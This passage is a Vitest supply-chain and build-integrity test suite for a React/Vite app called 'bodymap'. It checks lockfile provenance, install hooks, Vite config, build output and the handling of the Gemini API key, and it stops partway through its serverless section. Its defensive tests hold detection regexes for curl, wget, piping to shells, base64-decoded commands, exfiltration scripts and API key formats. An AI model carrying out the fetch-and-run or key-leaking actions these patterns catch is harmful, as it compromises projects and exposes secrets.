import { describe, it, expect } from 'vitest'
import fs from 'fs'
import path from 'path'

// ============================================================================
// PRODUCTION SUPPLY-CHAIN & BUILD/DEPLOYMENT INTEGRITY ORACLE
// End-to-End Forensic Verification:
// SOURCE REPO -> DEPENDENCY GRAPH -> BUILD SYSTEM -> ARTIFACT -> LIVE PRODUCTION
// ============================================================================

const rootDir = process.cwd()
const pkgPath = path.resolve(rootDir, 'package.json')
const lockPath = path.resolve(rootDir, 'package-lock.json')
const viteConfigPath = path.resolve(rootDir, 'vite.config.ts')
const vercelConfigPath = path.resolve(rootDir, 'vercel.json')
const apiHandlerPath = path.resolve(rootDir, 'api/generate-plan.ts')
const distDir = path.resolve(rootDir, 'dist')
const distAssetsDir = path.resolve(distDir, 'assets')
const distFontsDir = path.resolve(distDir, 'fonts')

interface PackageJson {
  name?: string
  version?: string
  private?: boolean
  type?: string
  scripts?: Record<string, string>
  dependencies?: Record<string, string>
  devDependencies?: Record<string, string>
  overrides?: Record<string, string>
}

interface PackageLock {
  name?: string
  version?: string
  lockfileVersion?: number
  packages?: Record<string, {
    version?: string
    resolved?: string
    integrity?: string
    hasInstallScript?: boolean
    scripts?: Record<string, string>
    link?: boolean
  }>
}

interface VercelConfig {
  cleanUrls?: boolean
  headers?: Array<{
    source: string
    headers: Array<{ key: string; value: string }>
  }>
  rewrites?: Array<{
    source: string
    destination: string
  }>
}

const pkg: PackageJson = JSON.parse(fs.readFileSync(pkgPath, 'utf8'))
const lock: PackageLock = JSON.parse(fs.readFileSync(lockPath, 'utf8'))
const viteConfigCode = fs.readFileSync(viteConfigPath, 'utf8')
const vercelConfig: VercelConfig = JSON.parse(fs.readFileSync(vercelConfigPath, 'utf8'))
const apiHandlerCode = fs.readFileSync(apiHandlerPath, 'utf8')

function getAllFiles(dir: string): string[] {
  if (!fs.existsSync(dir)) return []
  const entries = fs.readdirSync(dir, { withFileTypes: true })
  const files: string[] = []
  for (const entry of entries) {
    const full = path.join(dir, entry.name)
    if (entry.isDirectory()) {
      files.push(...getAllFiles(full))
    } else {
      files.push(full)
    }
  }
  return files
}

function getSrcNonTestFiles(): string[] {
  const all = getAllFiles(path.resolve(rootDir, 'src'))
  return all.filter(f => !f.includes('__tests__') && !f.endsWith('.test.ts') && !f.endsWith('.test.tsx'))
}

// ----------------------------------------------------------------------------
// SECTION A: DEPENDENCY PROVENANCE & LOCKFILE INTEGRITY (A01 - A30)
// ----------------------------------------------------------------------------
describe('Section A: Dependency Provenance & Lockfile Integrity', () => {
  it('A01: package.json exists and is valid JSON', () => {
    expect(pkg).toBeDefined()
    expect(typeof pkg).toBe('object')
  })

  it('A02: package.json specifies private: true to prevent unauthorized publishing', () => {
    expect(pkg.private).toBe(true)
  })

  it('A03: package.json specifies type: "module" for standard ESM execution', () => {
    expect(pkg.type).toBe('module')
  })

  it('A04: package.json name is strictly "bodymap"', () => {
    expect(pkg.name).toBe('bodymap')
  })

  it('A05: package.json specifies semver version format', () => {
    expect(pkg.version).toMatch(/^\d+\.\d+\.\d+/)
  })

  it('A06: package-lock.json exists and parses cleanly', () => {
    expect(lock).toBeDefined()
    expect(typeof lock).toBe('object')
  })

  it('A07: package-lock.json specifies lockfileVersion === 3', () => {
    expect(lock.lockfileVersion).toBe(3)
  })

  it('A08: package-lock.json contains non-empty packages registry map', () => {
    const packages = lock.packages || {}
    expect(Object.keys(packages).length).toBeGreaterThan(100)
  })

  it('A09: 100% of resolved packages in lockfile use secure HTTPS protocol', () => {
    const packages = lock.packages || {}
    for (const [pkgKey, pkgData] of Object.entries(packages)) {
      if (pkgData.resolved) {
        expect(pkgData.resolved.startsWith('https://'), `Package ${pkgKey} resolved insecurely: ${pkgData.resolved}`).toBe(true)
      }
    }
  })

  it('A10: Zero packages in package-lock.json resolve to unencrypted http://', () => {
    const packages = lock.packages || {}
    const insecure = Object.entries(packages).filter(([, d]) => d.resolved && d.resolved.startsWith('http://'))
    expect(insecure.length).toBe(0)
  })

  it('A11: Zero packages in package-lock.json resolve to git protocols (git://, git+ssh://, git+https://)', () => {
    const packages = lock.packages || {}
    const gitPkgs = Object.entries(packages).filter(([, d]) => d.resolved && /^git(?:\+[a-z]+)?:\/\//i.test(d.resolved))
    expect(gitPkgs.length).toBe(0)
  })

  it('A12: Zero packages in package-lock.json resolve to unverified GitHub tarballs or commits', () => {
    const packages = lock.packages || {}
    const ghPkgs = Object.entries(packages).filter(([, d]) => d.resolved && (d.resolved.includes('github.com') || d.resolved.includes('codeload.github.com')))
    expect(ghPkgs.length).toBe(0)
  })

  it('A13: Zero packages in package-lock.json resolve to local file paths (file: or link:)', () => {
    const packages = lock.packages || {}
    const localPkgs = Object.entries(packages).filter(([, d]) => d.link || (d.resolved && d.resolved.startsWith('file:')))
    expect(localPkgs.length).toBe(0)
  })

  it('A14: 100% of external packages in package-lock.json resolve from official registry.npmjs.org', () => {
    const packages = lock.packages || {}
    for (const [pkgKey, pkgData] of Object.entries(packages)) {
      if (pkgData.resolved) {
        expect(pkgData.resolved.startsWith('https://registry.npmjs.org/'), `Package ${pkgKey} uses unauthorized registry: ${pkgData.resolved}`).toBe(true)
      }
    }
  })

  it('A15: All resolved package entries possess cryptographic integrity signatures', () => {
    const packages = lock.packages || {}
    for (const [pkgKey, pkgData] of Object.entries(packages)) {
      if (pkgData.resolved) {
        expect(pkgData.integrity, `Missing integrity checksum for ${pkgKey}`).toBeDefined()
        expect(pkgData.integrity?.length).toBeGreaterThan(20)
      }
    }
  })

  it('A16: Package integrity signatures strictly utilize SHA-512 standard', () => {
    const packages = lock.packages || {}
    for (const [, pkgData] of Object.entries(packages)) {
      if (pkgData.integrity) {
        expect(pkgData.integrity.startsWith('sha512-')).toBe(true)
      }
    }
  })

  it('A17: package.json overrides enforces secure esbuild (^0.25.0)', () => {
    expect(pkg.overrides).toBeDefined()
    expect(pkg.overrides?.esbuild).toBe('^0.25.0')
  })

  it('A18: Core dependency react is pinned to standard stable version', () => {
    expect(pkg.dependencies?.react).toBe('^18.3.1')
  })

  it('A19: Core dependency react-dom matches react version', () => {
    expect(pkg.dependencies?.['react-dom']).toBe('^18.3.1')
  })

  it('A20: Core dependency react-router-dom is pinned to ^7.18.2', () => {
    expect(pkg.dependencies?.['react-router-dom']).toBe('^7.18.2')
  })

  it('A21: Core dependency zod is pinned to ^3.23.8', () => {
    expect(pkg.dependencies?.zod).toBe('^3.23.8')
  })

  it('A22: Core dependency lucide-react is pinned to ^0.462.0', () => {
    expect(pkg.dependencies?.['lucide-react']).toBe('^0.462.0')
  })

  it('A23: Core dependency clsx is pinned to ^2.1.1', () => {
    expect(pkg.dependencies?.clsx).toBe('^2.1.1')
  })

  it('A24: Core dependency tailwind-merge is pinned to ^2.5.2', () => {
    expect(pkg.dependencies?.['tailwind-merge']).toBe('^2.5.2')
  })

  it('A25: Zero production runtime dependencies use wildcard "*" or "latest"', () => {
    const deps = Object.entries(pkg.dependencies || {})
    for (const [name, ver] of deps) {
      expect(ver, `Wildcard dependency detected in ${name}`).not.toBe('*')
      expect(ver, `Latest dependency detected in ${name}`).not.toBe('latest')
    }
  })

  it('A26: Zero devDependencies use wildcard "*" or "latest"', () => {
    const devDeps = Object.entries(pkg.devDependencies || {})
    for (const [name, ver] of devDeps) {
      expect(ver, `Wildcard devDependency detected in ${name}`).not.toBe('*')
      expect(ver, `Latest devDependency detected in ${name}`).not.toBe('latest')
    }
  })

  it('A27: Zero internal scoped package confusion vectors (@bodymap/*) in dependencies', () => {
    const allDepKeys = [...Object.keys(pkg.dependencies || {}), ...Object.keys(pkg.devDependencies || {})]
    const internalScoped = allDepKeys.filter(k => k.startsWith('@bodymap/'))
    expect(internalScoped.length).toBe(0)
  })

  it('A28: Lockfile root entry matches package.json name and version', () => {
    const rootLockPkg = lock.packages?.['']
    expect(rootLockPkg).toBeDefined()
    expect(rootLockPkg?.name).toBe(pkg.name)
    expect(rootLockPkg?.version).toBe(pkg.version)
  })

  it('A29: Production runtime dependencies count is strictly 16', () => {
    expect(Object.keys(pkg.dependencies || {}).length).toBe(16)
  })

  it('A30: Development dependencies count is strictly controlled (20 tools)', () => {
    expect(Object.keys(pkg.devDependencies || {}).length).toBe(20)
  })
})

// ----------------------------------------------------------------------------
// SECTION B: SUPPLY-CHAIN ATTACK SURFACE & LIFECYCLE HOOK FORENSICS (B01 - B25)
// ----------------------------------------------------------------------------
describe('Section B: Supply-Chain Attack Surface & Lifecycle Hook Forensics', () => {
  const allowedInstallScriptPackages = new Set([
    'node_modules/@swc/core',
    'node_modules/esbuild',
    'node_modules/fsevents'
  ])

  it('B01: Forensic scan of package-lock.json: zero packages have preinstall scripts', () => {
    const packages = lock.packages || {}
    const preinstallPkgs = Object.entries(packages).filter(([, d]) => d.scripts && d.scripts.preinstall)
    expect(preinstallPkgs.length).toBe(0)
  })

  it('B02: Forensic scan of package-lock.json: zero unauthorized packages have hasInstallScript', () => {
    const packages = lock.packages || {}
    const unauthorized = Object.entries(packages).filter(([pkgPath, d]) => {
      return d.hasInstallScript && !allowedInstallScriptPackages.has(pkgPath)
    })
    expect(unauthorized.length).toBe(0)
  })

  it('B03: Exactly 3 allowlisted native compiler packages have hasInstallScript: true', () => {
    const packages = lock.packages || {}
    const installScriptPkgs = Object.keys(packages).filter(p => packages[p].hasInstallScript)
    expect(installScriptPkgs.length).toBe(3)
    for (const p of installScriptPkgs) {
      expect(allowedInstallScriptPackages.has(p)).toBe(true)
    }
  })

  it('B04: Every other package in package-lock.json has hasInstallScript falsy', () => {
    const packages = lock.packages || {}
    for (const [pkgPath, d] of Object.entries(packages)) {
      if (!allowedInstallScriptPackages.has(pkgPath)) {
        expect(Boolean(d.hasInstallScript)).toBe(false)
      }
    }
  })

  it('B05: Zero runtime production dependencies have install or postinstall scripts', () => {
    const prodDeps = Object.keys(pkg.dependencies || {})
    const packages = lock.packages || {}
    for (const dep of prodDeps) {
      const lockEntry = packages[`node_modules/${dep}`]
      if (lockEntry) {
        expect(Boolean(lockEntry.hasInstallScript)).toBe(false)
        expect(lockEntry.scripts?.postinstall).toBeUndefined()
        expect(lockEntry.scripts?.install).toBeUndefined()
      }
    }
  })

  it('B06: package.json scripts contain NO preinstall hook', () => {
    expect(pkg.scripts?.preinstall).toBeUndefined()
  })

  it('B07: package.json scripts contain NO install hook', () => {
    expect(pkg.scripts?.install).toBeUndefined()
  })

  it('B08: package.json scripts contain NO postinstall hook', () => {
    expect(pkg.scripts?.postinstall).toBeUndefined()
  })

  it('B09: package.json scripts contain NO prepublish hook', () => {
    expect(pkg.scripts?.prepublish).toBeUndefined()
    expect(pkg.scripts?.prepublishOnly).toBeUndefined()
  })

  it('B10: package.json scripts contain NO prepare hook', () => {
    expect(pkg.scripts?.prepare).toBeUndefined()
  })

  it('B11: package.json script "dev" invokes only "vite"', () => {
    expect(pkg.scripts?.dev?.trim()).toBe('vite')
  })

  it('B12: package.json script "build" invokes strictly "tsc && vite build"', () => {
    expect(pkg.scripts?.build?.trim()).toBe('tsc && vite build')
  })

  it('B13: package.json script "lint" invokes strictly "eslint ."', () => {
    expect(pkg.scripts?.lint?.trim()).toBe('eslint .')
  })

  it('B14: package.json script "typecheck" invokes strictly "tsc --noEmit"', () => {
    expect(pkg.scripts?.typecheck?.trim()).toBe('tsc --noEmit')
  })

  it('B15: package.json script "test" invokes strictly "vitest run"', () => {
    expect(pkg.scripts?.test?.trim()).toBe('vitest run')
  })

  it('B16: Zero scripts contain shell pipelining to bash or sh', () => {
    const scripts = Object.values(pkg.scripts || {})
    for (const script of scripts) {
      expect(script).not.toMatch(/\|\s*(?:bash|sh|zsh|powershell|pwsh)/i)
      expect(script).not.toMatch(/curl\s+/i)
      expect(script).not.toMatch(/wget\s+/i)
    }
  })

  it('B17: Zero scripts execute arbitrary remote URLs', () => {
    const scripts = Object.values(pkg.scripts || {})
    for (const script of scripts) {
      expect(script).not.toMatch(/https?:\/\//i)
    }
  })

  it('B18: Zero npm scripts execute base64-encoded commands', () => {
    const scripts = Object.values(pkg.scripts || {})
    for (const script of scripts) {
      expect(script).not.toMatch(/base64\s+(?:-d|--decode)/i)
      expect(script).not.toMatch(/FromBase64String/i)
    }
  })

  it('B19: Zero npm scripts disable security linters or typechecks', () => {
    const scripts = Object.values(pkg.scripts || {})
    for (const script of scripts) {
      expect(script).not.toContain('--no-verify')
      expect(script).not.toContain('--force')
      expect(script).not.toContain('--ignore-scripts')
    }
  })

  it('B20: All direct production dependencies exist in node_modules directory', () => {
    const prodDeps = Object.keys(pkg.dependencies || {})
    for (const dep of prodDeps) {
      const depPath = path.resolve(rootDir, 'node_modules', dep)
      expect(fs.existsSync(depPath), `Missing installed dependency: ${dep}`).toBe(true)
    }
  })

  it('B21: All direct development dependencies exist in node_modules directory', () => {
    const devDeps = Object.keys(pkg.devDependencies || {})
    for (const dep of devDeps) {
      const depPath = path.resolve(rootDir, 'node_modules', dep)
      expect(fs.existsSync(depPath), `Missing installed devDependency: ${dep}`).toBe(true)
    }
  })

  it('B22: Node modules .bin directory exists and contains expected toolchain binaries', () => {
    const binDir = path.resolve(rootDir, 'node_modules/.bin')
    expect(fs.existsSync(binDir)).toBe(true)
    const bins = fs.readdirSync(binDir)
    expect(bins.some(b => b.startsWith('vite'))).toBe(true)
    expect(bins.some(b => b.startsWith('tsc'))).toBe(true)
    expect(bins.some(b => b.startsWith('eslint'))).toBe(true)
    expect(bins.some(b => b.startsWith('vitest'))).toBe(true)
  })

  it('B23: Node engine and cross-platform compatibility: scripts do not use unix-only commands', () => {
    const scripts = Object.values(pkg.scripts || {})
    for (const script of scripts) {
      expect(script).not.toMatch(/\b(?:rm -rf|cp -r|mv|mkdir -p|touch)\b/)
    }
  })

  it('B24: No unauthorized post-build upload or exfiltration scripts in package.json', () => {
    const scripts = Object.keys(pkg.scripts || {})
    const postBuildScripts = scripts.filter(s => s.startsWith('postbuild') || s.startsWith('prepublish'))
    expect(postBuildScripts.length).toBe(0)
  })

  it('B25: No hidden telemetry or tracking scripts in package.json', () => {
    const scriptBodies = Object.values(pkg.scripts || {}).join(' ')
    expect(scriptBodies).not.toMatch(/telemetry|analytics|track|collect/i)
  })
})

// ----------------------------------------------------------------------------
// SECTION C: BUILD INTEGRITY & VITE/ROLLUP BUNDLING FORENSICS (C01 - C30)
// ----------------------------------------------------------------------------
describe('Section C: Build Integrity & Vite/Rollup Bundling Forensics', () => {
  it('C01: vite.config.ts exists and is readable', () => {
    expect(viteConfigCode).toBeDefined()
    expect(viteConfigCode.length).toBeGreaterThan(100)
  })

  it('C02: vite.config.ts imports standard Vite and React SWC plugin', () => {
    expect(viteConfigCode).toContain("from 'vite'")
    expect(viteConfigCode).toContain("from '@vitejs/plugin-react-swc'")
  })

  it('C03: geminiDevApiPlugin is explicitly scoped with apply: "serve"', () => {
    expect(viteConfigCode).toMatch(/name:\s*['"]gemini-dev-api['"],\s*apply:\s*['"]serve['"]/)
  })

  it('C04: spaFallbackPlugin is explicitly scoped with apply: "build"', () => {
    expect(viteConfigCode).toMatch(/name:\s*['"]spa-fallback['"],\s*apply:\s*['"]build['"]/)
  })

  it('C05: Production build config explicitly sets sourcemap: false', () => {
    expect(viteConfigCode).toMatch(/sourcemap:\s*false/)
  })

  it('C06: Production build config explicitly sets minify: "esbuild"', () => {
    expect(viteConfigCode).toMatch(/minify:\s*['"]esbuild['"]/)
  })

  it('C07: Production build config explicitly sets target: "es2020"', () => {
    expect(viteConfigCode).toMatch(/target:\s*['"]es2020['"]/)
  })

  it('C08: Rollup output defines manualChunks for react-vendor', () => {
    expect(viteConfigCode).toContain("'react-vendor'")
  })

  it('C09: Rollup output defines manualChunks for ui-vendor', () => {
    expect(viteConfigCode).toContain("'ui-vendor'")
  })

  it('C10: react-vendor manualChunk isolates react, react-dom, and react-router-dom', () => {
    expect(viteConfigCode).toMatch(/'react-vendor':\s*\['react',\s*'react-dom',\s*'react-router-dom'\]/)
  })

  it('C11: ui-vendor manualChunk isolates lucide-react, zod, clsx, tailwind-merge', () => {
    expect(viteConfigCode).toMatch(/'ui-vendor':\s*\['lucide-react',\s*'zod',\s*'clsx',\s*'tailwind-merge'\]/)
  })

  it('C12: vite.config.ts defines path alias @ resolving to ./src', () => {
    expect(viteConfigCode).toContain("'@': path.resolve(process.cwd(), './src')")
  })

  it('C13: vite.config.ts does NOT define custom define replacements injecting secrets', () => {
    expect(viteConfigCode).not.toMatch(/define:\s*\{/)
  })

  it('C14: vite.config.ts does NOT define custom envPrefix exposing server secrets', () => {
    expect(viteConfigCode).not.toMatch(/envPrefix:\s*['"]/)
  })

  it('C15: Dev server is explicitly bound to localhost and port 8080', () => {
    expect(viteConfigCode).toContain("host: 'localhost'")
    expect(viteConfigCode).toContain("port: 8080")
  })

  it('C16: geminiDevApiPlugin enforces MAX_PAYLOAD_SIZE = 16 * 1024 bytes', () => {
    expect(viteConfigCode).toContain("const MAX_PAYLOAD_SIZE = 16 * 1024")
  })

  it('C17: geminiDevApiPlugin checks req.method === "POST"', () => {
    expect(viteConfigCode).toContain("if (req.method !== 'POST')")
  })

  it('C18: geminiDevApiPlugin returns HTTP 405 for non-POST methods', () => {
    expect(viteConfigCode).toContain("res.statusCode = 405")
    expect(viteConfigCode).toContain("Method Not Allowed")
  })

  it('C19: geminiDevApiPlugin returns HTTP 413 when body exceeds MAX_PAYLOAD_SIZE', () => {
    expect(viteConfigCode).toContain("res.statusCode = 413")
    expect(viteConfigCode).toContain("Payload Too Large")
  })

  it('C20: geminiDevApiPlugin validates formData object existence and type', () => {
    expect(viteConfigCode).toContain("typeof parsed.formData !== 'object'")
    expect(viteConfigCode).toContain("A valid formData object is required")
  })

  it('C21: geminiDevApiPlugin responds with Content-Type: application/json', () => {
    expect(viteConfigCode).toContain("res.setHeader('Content-Type', 'application/json')")
  })

  it('C22: spaFallbackPlugin copies dist/index.html to dist/404.html during closeBundle', () => {
    expect(viteConfigCode).toContain("fs.copyFileSync(indexPath, fallbackPath)")
    expect(viteConfigCode).toContain("Created dist/404.html for SPA deep-link routing")
  })

  it('C23: generateDevPrompt in vite.config.ts includes client metrics safely', () => {
    expect(viteConfigCode).toContain("Primary Goal:")
    expect(viteConfigCode).toContain("Client Metrics:")
  })

  it('C24: generateDevPrompt includes 7-day formatting guidelines', () => {
    expect(viteConfigCode).toContain("Divide clearly into 7 distinct days")
  })

  it('C25: generateDevPrompt handles nutrition and recovery metrics', () => {
    expect(viteConfigCode).toContain("Nutrition & Recovery:")
    expect(viteConfigCode).toContain("Dietary Preference:")
  })

  it('C26: vite.config.ts contains zero inline production API keys or tokens', () => {
    expect(viteConfigCode).not.toMatch(/AIzaSy[0-9A-Za-z-_]{33}/)
    expect(viteConfigCode).not.toMatch(/sk-[a-zA-Z0-9]{20,}/)
  })

  it('C27: vite.config.ts does NOT use eval or Function constructor', () => {
    expect(viteConfigCode).not.toContain("eval(")
    expect(viteConfigCode).not.toContain("new Function(")
  })

  it('C28: vite.config.ts uses ES modules import/export syntax exclusively', () => {
    expect(viteConfigCode).toContain("import { defineConfig")
    expect(viteConfigCode).toContain("export default defineConfig")
  })

  it('C29: Production build output directory defaults cleanly to "dist"', () => {
    expect(viteConfigCode).not.toMatch(/outDir:\s*['"][^d]/)
  })

  it('C30: Production build does not copy .env or sensitive config to dist', () => {
    expect(viteConfigCode).not.toMatch(/copyFileSync\([^)]*\.env/i)
  })
})

// ----------------------------------------------------------------------------
// SECTION D: ARTIFACT REPRODUCIBILITY & CONTENT LEAKAGE FORENSICS (D01 - D25)
// ----------------------------------------------------------------------------
describe('Section D: Artifact Reproducibility & Content Leakage Forensics', () => {
  it('D01: dist directory exists and is a valid directory', () => {
    expect(fs.existsSync(distDir)).toBe(true)
    expect(fs.statSync(distDir).isDirectory()).toBe(true)
  })

  it('D02: dist/index.html exists and has valid HTML document structure', () => {
    const indexPath = path.join(distDir, 'index.html')
    expect(fs.existsSync(indexPath)).toBe(true)
    const indexContent = fs.readFileSync(indexPath, 'utf8')
    expect(indexContent).toMatch(/<!doctype\s+html>/i)
    expect(indexContent).toContain('<html')
    expect(indexContent).toContain('</html>')
  })

  it('D03: dist/404.html exists and matches dist/index.html content size', () => {
    const indexPath = path.join(distDir, 'index.html')
    const fallbackPath = path.join(distDir, '404.html')
    expect(fs.existsSync(fallbackPath)).toBe(true)
    const indexStat = fs.statSync(indexPath)
    const fallbackStat = fs.statSync(fallbackPath)
    expect(fallbackStat.size).toBe(indexStat.size)
  })

  it('D04: dist/assets directory exists and contains compiled bundle files', () => {
    expect(fs.existsSync(distAssetsDir)).toBe(true)
    const files = fs.readdirSync(distAssetsDir)
    expect(files.length).toBeGreaterThan(10)
  })

  it('D05: Every file in dist/assets has extension .js or .css', () => {
    const files = fs.readdirSync(distAssetsDir)
    for (const file of files) {
      const isJsOrCss = file.endsWith('.js') || file.endsWith('.css')
      expect(isJsOrCss, `Unexpected asset extension: ${file}`).toBe(true)
    }
  })

  it('D06: Zero .map files exist in dist/assets', () => {
    const files = fs.readdirSync(distAssetsDir)
    const mapFiles = files.filter(f => f.endsWith('.map'))
    expect(mapFiles.length).toBe(0)
  })

  it('D07: Zero .map files exist anywhere in the entire dist directory tree', () => {
    const allDistFiles = getAllFiles(distDir)
    const mapFiles = allDistFiles.filter(f => f.endsWith('.map'))
    expect(mapFiles.length).toBe(0)
  })

  it('D08: Zero .env or .env.* files exist anywhere in dist', () => {
    const allDistFiles = getAllFiles(distDir)
    const envFiles = allDistFiles.filter(f => path.basename(f).startsWith('.env'))
    expect(envFiles.length).toBe(0)
  })

  it('D09: Zero .ts or .tsx source files exist in dist', () => {
    const allDistFiles = getAllFiles(distDir)
    const tsFiles = allDistFiles.filter(f => f.endsWith('.ts') || f.endsWith('.tsx'))
    expect(tsFiles.length).toBe(0)
  })

  it('D10: Zero .json source files or package configs exist in dist', () => {
    const allDistFiles = getAllFiles(distDir)
    const jsonFiles = allDistFiles.filter(f => f.endsWith('.json'))
    expect(jsonFiles.length).toBe(0)
  })

  it('D11: dist/fonts directory exists and contains self-hosted typography', () => {
    expect(fs.existsSync(distFontsDir)).toBe(true)
    const fonts = fs.readdirSync(distFontsDir)
    expect(fonts.length).toBeGreaterThan(0)
  })

  it('D12: Font files in dist/fonts strictly use standard web font formats (.woff2, .ttf)', () => {
    const fonts = fs.readdirSync(distFontsDir)
    for (const font of fonts) {
      const valid = font.endsWith('.woff2') || font.endsWith('.ttf') || font.endsWith('.css')
      expect(valid, `Non-standard font file: ${font}`).toBe(true)
    }
  })

  it('D13: dist/robots.txt exists and specifies valid crawl directives', () => {
    const robotsPath = path.join(distDir, 'robots.txt')
    expect(fs.existsSync(robotsPath)).toBe(true)
    const robots = fs.readFileSync(robotsPath, 'utf8')
    expect(robots).toContain('User-agent:')
  })

  it('D14: dist/favicon.ico exists', () => {
    expect(fs.existsSync(path.join(distDir, 'favicon.ico'))).toBe(true)
  })

  it('D15: dist/favicon.svg exists', () => {
    expect(fs.existsSync(path.join(distDir, 'favicon.svg'))).toBe(true)
  })

  it('D16: dist/og-image.png exists and is non-empty', () => {
    const ogPath = path.join(distDir, 'og-image.png')
    expect(fs.existsSync(ogPath)).toBe(true)
    expect(fs.statSync(ogPath).size).toBeGreaterThan(1000)
  })

  it('D17: dist/index.html contains strictly local asset references (/assets/..., /fonts/...)', () => {
    const indexContent = fs.readFileSync(path.join(distDir, 'index.html'), 'utf8')
    expect(indexContent).toMatch(/src=["']\/assets\//)
    expect(indexContent).not.toMatch(/src=["']https?:\/\//)
  })

  it('D18: dist/index.html contains zero third-party script tags', () => {
    const indexContent = fs.readFileSync(path.join(distDir, 'index.html'), 'utf8')
    const externalScripts = indexContent.match(/<script[^>]+src=["']https?:\/\/[^"']+["']/gi)
    expect(externalScripts).toBeNull()
  })

  it('D19: dist/index.html contains zero third-party stylesheet links', () => {
    const indexContent = fs.readFileSync(path.join(distDir, 'index.html'), 'utf8')
    const externalStyles = indexContent.match(/<link[^>]+rel=["']stylesheet["'][^>]+href=["']https?:\/\/[^"']+["']/gi)
    expect(externalStyles).toBeNull()
  })

  it('D20: Bundle scanning: dist/assets contains zero occurrences of GEMINI_API_KEY string', () => {
    const jsFiles = getAllFiles(distAssetsDir).filter(f => f.endsWith('.js'))
    for (const jsFile of jsFiles) {
      const code = fs.readFileSync(jsFile, 'utf8')
      expect(code, `GEMINI_API_KEY string leaked into ${path.basename(jsFile)}`).not.toContain('GEMINI_API_KEY')
    }
  })

  it('D21: Bundle scanning: dist/assets contains zero Google AI API key patterns (AIzaSy...)', () => {
    const jsFiles = getAllFiles(distAssetsDir).filter(f => f.endsWith('.js'))
    for (const jsFile of jsFiles) {
      const code = fs.readFileSync(jsFile, 'utf8')
      expect(code).not.toMatch(/AIzaSy[0-9A-Za-z-_]{33}/)
    }
  })

  it('D22: Bundle scanning: dist/assets contains zero developer machine paths (Users/kunda)', () => {
    const textFiles = getAllFiles(distAssetsDir).filter(f => f.endsWith('.js') || f.endsWith('.css'))
    for (const f of textFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toMatch(/Users[\\/]kunda/i)
    }
  })

  it('D23: Bundle scanning: dist/assets contains zero references to process.env.GEMINI_API_KEY', () => {
    const jsFiles = getAllFiles(distAssetsDir).filter(f => f.endsWith('.js'))
    for (const jsFile of jsFiles) {
      const code = fs.readFileSync(jsFile, 'utf8')
      expect(code).not.toContain('process.env.GEMINI_API_KEY')
    }
  })

  it('D24: Bundle scanning: dist/index.html contains zero secret strings or tokens', () => {
    const indexContent = fs.readFileSync(path.join(distDir, 'index.html'), 'utf8')
    expect(indexContent).not.toContain('GEMINI_API_KEY')
    expect(indexContent).not.toMatch(/AIzaSy[0-9A-Za-z-_]{33}/)
    expect(indexContent).not.toMatch(/sk-[a-zA-Z0-9]{20,}/)
  })

  it('D25: Asset allowlist: every file in dist matches approved production artifact types', () => {
    const approvedExtensions = new Set(['.html', '.js', '.css', '.woff2', '.ttf', '.ico', '.svg', '.png', '.jpg', '.txt'])
    const allDistFiles = getAllFiles(distDir)
    for (const f of allDistFiles) {
      const ext = path.extname(f)
      expect(approvedExtensions.has(ext), `Unapproved file in dist: ${f}`).toBe(true)
    }
  })
})

// ----------------------------------------------------------------------------
// SECTION E: SERVERLESS SECRET SEGREGATION & ENVIRONMENT BOUNDARY (E01 - E25)
// ----------------------------------------------------------------------------
describe('Section E: Serverless Secret Segregation & Environment Boundary', () => {
  it('E01: api/generate-plan.ts exists and is the sole serverless API entrypoint', () => {
    expect(fs.existsSync(apiHandlerPath)).toBe(true)
    const apiDir = path.resolve(rootDir, 'api')
    const apiFiles = fs.readdirSync(apiDir)
    expect(apiFiles).toEqual(['generate-plan.ts'])
  })

  it('E02: api/generate-plan.ts accesses process.env.GEMINI_API_KEY safely in serverless context', () => {
    expect(apiHandlerCode).toContain('const apiKey = process.env.GEMINI_API_KEY')
  })

  it('E03: api/generate-plan.ts redacts apiKey from all error messages before sending', () => {
    expect(apiHandlerCode).toContain("const sanitizedError = apiKey ? rawError.split(apiKey).join('[REDACTED]') : rawError")
  })

  it('E04: api/generate-plan.ts error redaction substitutes exact secret with [REDACTED]', () => {
    expect(apiHandlerCode).toContain(".join('[REDACTED]')")
  })

  it('E05: api/generate-plan.ts bounds raw error message length to 200 characters', () => {
    expect(apiHandlerCode).toContain('const boundedError = sanitizedError.slice(0, 200)')
  })

  it('E06: api/generate-plan.ts enforces MAX_PAYLOAD_SIZE = 16 * 1024 bytes', () => {
    expect(apiHandlerCode).toContain('export const MAX_PAYLOAD_SIZE = 16 * 1024')
  })

  it('E07: api/generate-plan.ts enforces MAX_REQUEST_WALLCLOCK_MS = 26000 ms budget', () => {
    expect(apiHandlerCode).toContain('export const MAX_REQUEST_WALLCLOCK_MS = 26000')
  })

  it('E08: api/generate-plan.ts enforces MAX_IN_FLIGHT_REQUESTS = 6 concurrency guard', () => {
    expect(apiHandlerCode).toContain('export const MAX_IN_FLIGHT_REQUESTS = 6')
  })

  it('E09: api/generate-plan.ts enforces MAX_TOTAL_UPSTREAM_CALLS = 3 retry cap', () => {
    expect(apiHandlerCode).toContain('export const MAX_TOTAL_UPSTREAM_CALLS = 3')
  })

  it('E10: api/generate-plan.ts enforces PER_CALL_TIMEOUT_MS = 12000 ms limit', () => {
    expect(apiHandlerCode).toContain('export const PER_CALL_TIMEOUT_MS = 12000')
  })

  it('E11: api/generate-plan.ts imports only http, net, and zod', () => {
    expect(apiHandlerCode).toContain("import type { IncomingMessage, ServerResponse } from 'http'")
    expect(apiHandlerCode).toContain("import net from 'net'")
    expect(apiHandlerCode).toContain("import { z } from 'zod'")
  })

  it('E12: api/generate-plan.ts does NOT import client components or DOM libraries', () => {
    expect(apiHandlerCode).not.toContain("from 'react'")
    expect(apiHandlerCode).not.toContain("from 'react-dom'")
    expect(apiHandlerCode).not.toContain("from 'react-router-dom'")
    expect(apiHandlerCode).not.toContain("from '@/components")
  })

  it('E13: api/generate-plan.ts uses native fetch without third-party network clients', () => {
    expect(apiHandlerCode).not.toContain("from 'axios'")
    expect(apiHandlerCode).not.toContain("from 'node-fetch'")
    expect(apiHandlerCode).not.toContain("from 'got'")
  })

  it('E14: Client source file src/lib/gemini.ts invokes /api/generate-plan via relative path', () => {
    const geminiClientPath = path.resolve(rootDir, 'src/lib/gemini.ts')
    const geminiCode = fs.readFileSync(geminiClientPath, 'utf8')
    expect(geminiCode).toContain("fetch('/api/generate-plan'")
  })

  it('E15: Client source file src/lib/gemini.ts contains zero references to GEMINI_API_KEY', () => {
    const geminiClientPath = path.resolve(rootDir, 'src/lib/gemini.ts')
    const geminiCode = fs.readFileSync(geminiClientPath, 'utf8')
    expect(geminiCode).not.toContain('GEMINI_API_KEY')
  })

